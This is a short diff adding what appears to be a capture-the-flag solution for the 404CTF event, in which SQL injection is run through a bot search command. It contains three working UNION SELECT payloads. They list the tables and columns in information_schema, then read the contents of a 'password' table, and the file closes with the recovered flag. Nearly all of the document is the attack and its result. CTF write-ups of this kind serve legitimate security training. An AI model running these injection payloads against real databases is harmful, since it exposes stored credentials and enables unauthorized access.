@@ -1,0 +1,5 @@
+!chercher z"union select table_name FROM information_schema.columns where table_schema=database() -- "
+!chercher z"union select column_name FROM information_schema.columns where table_name='password' -- "
+!chercher z"union select password FROM password -- "
+
+# result 404CTF{D1sc0rd_&_injection_SQL}
